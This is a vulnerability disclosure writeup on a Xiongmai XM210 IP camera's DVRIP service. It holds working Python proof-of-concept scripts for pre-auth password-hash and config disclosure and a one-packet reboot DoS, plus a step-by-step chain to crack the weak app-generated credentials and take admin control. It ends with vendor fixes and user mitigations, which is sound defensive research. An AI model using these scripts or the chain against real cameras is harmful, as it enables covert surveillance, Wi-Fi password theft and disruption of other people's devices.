A friend handed me a small Wi-Fi IP camera he'd stopped using. I factory-reset it, paired it through the iCSee app onto an isolated test network, and started poking. What I found is the subject of this writeup: four real vulnerabilities on a device that's still being sold today, three of which appear to be unreported.
The short version: anyone on the same LAN as one of these cameras can pull the admin password hash without authenticating, crack it offline in a few seconds (because the iCSee app generates absurdly weak credentials), and then own the device — live video, recorded video, Wi-Fi PSK, the works. Plus a separate one-packet DoS for good measure.

Target

HardwareIPC_XM210_X2-WR-T_S38SoCXiongmai XM210 (Shenzhen iComm Semiconductor — OUI 10:65:19)OSRT-Thread RTOSFirmwareV5.06.R02.000999WP.00000.140f24.0000000 (built 2025-10-11)Provisioning appiCSee (com.xm.csee)Network protocolDVRIP / Sofia on TCP/34567
Xiongmai is an ODM — they don't sell under their own name, they sell platforms that get rebranded by hundreds of OEMs (Sricam, Floureon, KKMOON, Hiseeu, no-name-Amazon-listing-of-the-week, etc.). So "this brand isn't Xiongmai on the box" doesn't mean it's not affected. The XM210 SoC and V5.0x.R02 firmware lineage are widespread.

Why this device is unusual

Almost every published Xiongmai vulnerability targets the older Linux/Sofia/Hisilicon platform: HTTP buffer overflows, RTSP parser bugs, telnet-enable backdoors on port 9530, debug RCE on port 9527. None of that applies here.
This thing has exactly one TCP port open:
PORT      STATE         SERVICE
34567/tcp open          DVRIP/Sofia
34569/udp open|filtered DVRIP discovery

No HTTP. No RTSP. No ONVIF. No 9527, no 9530. Hostname comes back as rtthread_7730.lan, which was the first hint that this isn't the usual Linux/busybox build — it's a stripped-down RT-Thread RTOS port. Smaller attack surface, fewer historical CVEs apply, more interesting research target.
So the only thing to talk to is DVRIP on 34567. Everything below was found just by sending DVRIP packets and looking at responses.

Scope

Researcher's own device, on the researcher's own isolated lab network, factory-reset before testing. No firmware extraction, no UART work, no JTAG, no interaction with vendor cloud infrastructure. No weaponized payloads against the firmware-upgrade handler — that line was deliberately not crossed.
Everything is read-side / observational on the network. The findings still chain into full admin compromise, but via legitimate-looking DVRIP requests rather than memory corruption.

DVRIP packet format (for reference)
Offset  Size  Field
------  ----  --------------------------------------------------
0x00    1     Magic byte (0xFF)
0x01    1     Version (0x01)
0x02    2     Reserved
0x04    4     Session ID (little-endian)
0x08    4     Sequence number (little-endian)
0x0C    1     Total packets (0)
0x0D    1     Current packet (0)
0x0E    2     MsgID (little-endian)
0x10    4     Body length (little-endian)
0x14    var   JSON body, terminated by "\n\x00"

Auth lives in the Session ID field: after a successful login (MsgID 1000) the device hands you a session and you put it in the header for subsequent requests. Or so the protocol intends. 

About that.

Findings overview
| # | Finding                                | CVSS 3.1 (LAN) | (Internet-exposed) |
|---|----------------------------------------|----------------|--------------------|
| 1 | Pre-auth user/hash disclosure          | 6.1            | 7.5                |
| 2 | Pre-auth configuration disclosure      | 3.5            | 5.3                |
| 3 | Unauthenticated DoS via malformed DVRIP | 6.5           | 8.6                |
| 4 | iCSee app weak credential generation   | 6.4            | 8.1                |

| **#1 + #4 chained** | | **8.3 (High)** | **9.8 (Critical)** |
End-to-end: from an IP address on the LAN to admin on the camera in under a minute, with no prior credentials. Details below.

Finding #1: Pre-auth user list and password hash disclosure

AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — 6.1 (Medium)
CWE-306 — Missing Authentication for Critical Function
I built a quick MsgID sweeper that sent each opcode in turn with SessionID: 0x00000000 and observed the response codes. Most opcodes came back Ret=203 (auth required) or Ret=205 (account locked, more on that). A handful came back Ret=100. Success.
Two of the Ret=100 opcodes were really not supposed to be:

MsgID 1470 — Users
MsgID 1472 — Groups

Both return the full user list, including XM-format password hashes, group memberships, and authority lists. Pre-auth. From a single TCP connection.
This is the same vulnerability class as CVE-2024-3765 (netsecfish, 2024), which was MsgID 1009. The vendor patched 1009 — confirmed by sending the exact PoC packet from netsecfish's repo and getting Ret=102 back ("method unsupported"). But the underlying authentication framework gap wasn't fixed; they just removed the one opcode that had been publicly disclosed. 1470 and 1472 still leak.

### PoC

```python
#!/usr/bin/env python3
import socket, struct

s = socket.socket()
s.connect(("", 34567))
body = b'{"Name":"Users","SessionID":"0x00000000"}\n\x00'
hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, 1470, len(body))
s.send(hdr + body)
print(s.recv(65536)[20:].decode(errors="replace"))
```

### What you get back

```json
{
  "Users": [
    {
      "Name": "<4-char-random>",
      "Group": "admin",
      "Memo": "admin 's account",
      "Password": "",
      "PasswordV2": "",
      "Token": "",
      "AuthorityList": ["ShutDown", "ChannelTitle", "DefaultConfig",
                        "SysUpgrade", "AutoMaintain", "GeneralConfig",
                        "NetConfig", "AlarmConfig", "VideoConfig",
                        "RecordConfig", "StorageManager", "..."]
    },
    {
      "Name": "admin",
      "Group": "admin",
      "Memo": "factory test account",
      "Password": "tlJwpbo6",
      "PasswordV2": ""
    }
  ],
  "SessionID": "0x00000000",
  "Name": "Users",
  "Ret": 100
}
```
Two things worth noting from this response on its own:

tlJwpbo6 is the XM-hash of the empty string. That second user — admin, marked factory test account — ships with a blank password on production firmware. This is the same default-credentials pattern Xiongmai has had since CVE-2016-1000246. Ten years and it's still in shipping firmware.
The first user has a randomly-generated 4-character name and a real hash. The app generates this during pairing. We come back to it in Finding #4.

You don't need to crack anything to log in as admin — just send tlJwpbo6 as the password hash. So the disclosure of the factory account's hash is academic; it's known. The disclosure of the pwxj-style account's hash is the thing that becomes interesting once we look at how the password is generated.


Finding #2: Pre-auth configuration disclosure (more opcodes, same bug)

AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — 3.5 (Low)
CWE-306 — Missing Authentication for Critical Function
The MsgID sweep also showed these opcodes responding Ret=100 with no session:
| MsgID | Name | What you get |
|-------|------|--------------|
| 1042 | `General` | Device general config (`AppBindFlag`, machine name, auto-maintain schedule) |
| 1046 | `Camera` | Stub response — full Camera config needs a sub-name parameter |
| 1050 | `Storage` | Stub |
| 1450 | `OPMachine` | Stub |

The full data on 1046/1050/1450 is gated on a sub-parameter that does seem to require a session, so what comes back is mostly a "yes I'd happily tell you, ask more specifically" stub. 1042 leaks more — config metadata, the cloud-bind flag, etc.
The Wi-Fi PSK is on MsgID 1042 with Name: "NetWork.Wifi", but that path does check the session, so the PSK isn't directly pre-auth-readable. You need to chain through Finding #4 to get there.
By itself this is low-impact information disclosure. The reason it's worth documenting is that it confirms the diagnosis: the auth gap on this firmware is a class issue affecting multiple opcodes, not a single-opcode oversight. Vendor needs a centralized fix, not another whack-a-mole patch.

### PoC

```python
import socket, struct, json
TARGETS = [(1042, "General"), (1046, "Camera"), (1050, "Storage"), (1450, "OPMachine")]
for mid, name in TARGETS:
    s = socket.socket(); s.connect(("<target>", 34567))
    body = (json.dumps({"Name": name, "SessionID": "0x00000000"}) + "\n\x00").encode()
    hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, mid, len(body))
    s.send(hdr + body)
    print(f"--- MsgID {mid} ({name}) ---")
    print(s.recv(65536)[20:].decode(errors="replace")[:300])
    s.close()
```





Finding #3: Unauthenticated DoS / watchdog reboot
AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H — 6.5 (Medium)
CWE-20 (Improper Input Validation) / CWE-730 (DoS by Reachable Assertion)
I noticed this one by accident. During the MsgID sweep, the camera dropped off the network briefly and rebooted itself. After looking at which opcodes preceded the reboot, four MsgIDs reliably reproduce it: 1054, 1400, 1410, 1514.
Send any of them with a malformed body (no required sub-parameters, or wrong types), the handler hangs, ~30 seconds later the hardware watchdog kicks in and reboots the device. Total downtime ~60–90 seconds.
No auth required. Single packet. Repeatable.

### PoC

```python
import socket, struct, json

s = socket.socket(); s.settimeout(3)
s.connect(("<target>", 34567))
body = (json.dumps({"Name": "System", "SessionID": "0x00000000"}) + "\n\x00").encode()
hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, 1054, len(body))
s.send(hdr + body)
try:
    print(s.recv(4096))
except socket.timeout:
    print("Handler hung. Watchdog reboot expected within ~30s.")
s.close()
```

Practical impact
A reboot loop is sustainable indefinitely from one packet on a timer. While the camera is rebooting, it's not recording — including any motion event during that window. So someone on the LAN can blind a camera by punting it to an infinite reboot cycle.
The other thing this implies, though I didn't investigate it: a handler that hangs on malformed input is a very plausible candidate for memory corruption. I didn't push on it because cooking up a working RCE payload is a different commitment level than I wanted to make on a device that ships in the wild on currently-shipping firmware. Worth flagging for anyone who picks this up later.

Finding #4: iCSee app generates absurdly weak admin credentials
AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — 8.3 (High) when chained with #1
CWE-331 — Insufficient Entropy

This is the one that makes Finding #1 actually matter.
When you pair a fresh camera through iCSee, the app generates an admin account and pushes it to the device. The credentials it picks are visible in the app's device-management screen. For my test device:
| Field | Pattern | Length | Entropy |
|-------|---------|--------|---------|
| Username | `[a-z]{4}` | 4 chars | ~18 bits |
| Password | `[a-z0-9]{6}` | 6 chars | ~31 bits |

That's a 36⁶ ≈ 2.2 × 10⁹ password search space. Hashcat mode 22401 supports the XM hash format directly. On any modern CPU you crack this in under 10 seconds, no GPU required. With a GPU you'd be done in milliseconds.
Sample observed: username abcd, password abc123.
For comparison, what these credentials should be: 12+ chars from a mixed-case + digits + symbols alphabet, ~75+ bits of entropy. Or, even better, a per-device cryptographically-derived secret bound to the device serial — that way even if it leaks, it doesn't leak in a brute-forceable way.

Caveat

I observed this format on one device, after one pairing. To turn this into a proper finding I'd want to confirm the pattern on a few more iCSee pairings (same device re-paired, ideally also a different device). Until then, this is "observed pattern, single sample." Calling it out so I'm honest about the evidence — it's almost certainly the global generation scheme, but I haven't proven that.

The chain
The two findings that matter on their own are #1 (hash leak) and #4 (weak credential generation). Chained, they are the whole show:
Step 1: Attacker on LAN port-scans, finds TCP/34567 open.
Step 2: One DVRIP packet (MsgID 1470, blank session).
        -> Full user list + hashes (Finding #1).
Step 3: Identify the iCSee-generated user
        (the 4-char random name in the "admin" group).
Step 4: Crack the 6-char password offline (hashcat -m 22401).
        -> < 10 seconds on a modern CPU.
Step 5: Authenticate to TCP/34567 with recovered credentials.
Step 6: You are admin. You can:
        - Pull live video stream
        - Download SD card recordings
        - Read NetWork.Wifi.Keys (plaintext WPA PSK)
        - Modify config / reboot / factory reset
        - Push a firmware "update"

End-to-end with no prior knowledge beyond an IP: under one minute.
AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 8.3 High
If the camera is port-forwarded to the internet (which the iCSee setup tutorials sometimes suggest for direct-IP access without P2P): 9.8 Critical.

What I actually demonstrated end-to-end on my own device
To make sure this isn't theoretical, I ran the chain through to actual impact. With the recovered credentials:

Live admin — full DVRIP control, user management, config read/write
SD card recording enumeration — MsgID 1440 returns a list of recorded clips with timestamps and filenames
Recording download — MsgID 1424 (OPPlayBack Claim) followed by MsgID 1420 with the action DownloadStart (one word, capital S — the specific action name was the thing that took longest to figure out, since "Start" alone returns Ret=100 but doesn't actually push any media). I pulled a 2.5 MB H.264 clip from one of the recordings, remuxed with ffmpeg -c copy, ffprobe confirmed playable.
Wi-Fi PSK — MsgID 1042 with Name: "NetWork.Wifi" returned the SSID and PSK in cleartext

That last one is worth a separate note: if you give one of these cameras to someone, they can pull your Wi-Fi password off it. Including someone who finds your discarded camera in the trash.

What I deliberately didn't do
A few rabbit holes I noticed and stayed out of, partly for time, partly for blast-radius reasons:

OPSystemUpgrade is reachable post-auth. The handler accepts firmware blobs and has a MaxBodyLen field of 16384 bytes per chunk. Historically (Linux/Sofia builds), the InstallDesc parsing in this opcode has been the crown jewel of XM exploit research. Whether the same bug class persists on RT-Thread, I don't know. Didn't want to develop a working exploit against current-shipping firmware.

The DoS handlers (Finding #3) probably hide memory corruption. A handler that hangs on malformed input rather than rejecting it cleanly is suspicious in the same way strcpy is suspicious. Worth fuzzing properly with boofuzz or similar.
Hardware phase. Open the case, find UART, dump flash, Ghidra. That's where you'd actually see why the auth check is missing on those MsgIDs — almost certainly a missing line in the dispatch table or a per-handler check that's just not there. I don't have the bench setup for it right now.

XMEye P2P cloud. The device has AppBindFlag.BeBinded: true and is actively maintaining a tunnel to xmeye.net infrastructure. There's published research on the P2P protocol from SEC Consult (2018, CVE-2018-17915/17917/17919). Active attacks against the cloud infrastructure itself are out of scope for me — that's third-party servers.


How this relates to existing CVEs?

I checked the public CVE record systematically. Most of what's there is for the older Linux/Sofia platform and doesn't apply to RT-Thread builds.
| CVE | Applies? | Why |
|-----|----------|-----|
| CVE-2016-1000246 | No | HTTP-based |
| CVE-2017-7577 | No | HTTP-based |
| CVE-2018-10088 | No | HTTP-based |
| CVE-2018-17915/17917/17919 | Likely (XMEye cloud) | Not tested in this study |
| CVE-2020-22253 | No | Port 9530 not present |
| CVE-2021-41506 | No | Port 9527 not present |
| CVE-2022-26259 | No | RTSP not present |
| CVE-2022-45045 | Possibly | DVRIP/34567 upgrade RCE; not tested |
| **CVE-2024-3765** | **Patched on this firmware, but class persists** | MsgID 1009 returns `Ret=102`. My findings are on opcodes the patch didn't touch. |
| CVE-2025-65856 | No | ONVIF, not present |
| CVE-2026-34005 | No | Linux/Sofia binary, this is RT-Thread |


The closest prior art is CVE-2024-3765. The framing in the writeup is: vendor patched the symptom, not the disease. Same root cause, different opcodes still vulnerable, on a newer firmware family that nobody has published findings on.


Suggested fixes
For the vendor:

Centralize the DVRIP auth check. The current architecture seems to require each handler to validate the session ID independently, which has now visibly failed on at least eight opcodes (1009 patched, plus 1042/1046/1050/1450/1470/1472 plus the DoS set). Move the check into the dispatch layer.
Fix iCSee credential generation. 6 lowercase-alphanumeric chars is not enough in 2026. 12+ chars mixed-case, or per-device cryptographic derivation.
Validate input on every DVRIP handler. A handler that hangs on bad input is a code-quality red flag broader than just DoS.
Drop the factory test account with blank password before shipping firmware images. This was a Mirai-era issue.
Encrypt Wi-Fi PSK at rest on the device. Plaintext is an unforced error.

For users (until any of the above happen):

Put the camera on an isolated network segment with no internet route. If you don't need iCSee remote access, block outbound to xmeye.net entirely.
After pairing, immediately change the iCSee-generated password to something strong. Don't leave the auto-generated one.
Don't port-forward TCP/34567 to the internet, ever.
If you've ever given one of these cameras to someone else (or it's been refurbished, or you bought it second-hand), treat the Wi-Fi password it last knew as compromised. Rotate.

Tooling
The PoC scripts that reproduce all four findings are in this repo as separate files. They use only the Python standard library plus, optionally, a one-line patch to OpenIPC's python-dvr (line 319 of dvrip.py — needs to handle the case where send() returns bytearray instead of dict on certain firmware response shapes; the original code does data["Ret"] and crashes).

References

CVE-2024-3765 — https://nvd.nist.gov/vuln/detail/CVE-2024-3765

netsecfish PoC for CVE-2024-3765 — https://github.com/netsecfish/xiongmai_incorrect_access_control

SEC Consult 2018 XMEye advisory — https://sec-consult.com/blog/detail/millions-of-xiongmai-video-surveillance-devices-can-be-hacked-via-cloud-feature-xmeye-p2p-cloud/

CISA ICSA-18-282-06 — https://www.cisa.gov/news-events/ics-advisories/icsa-18-282-06

python-dvr library — https://github.com/OpenIPC/python-dvr

CVSS 3.1 calculator — https://www.first.org/cvss/calculator/3.1
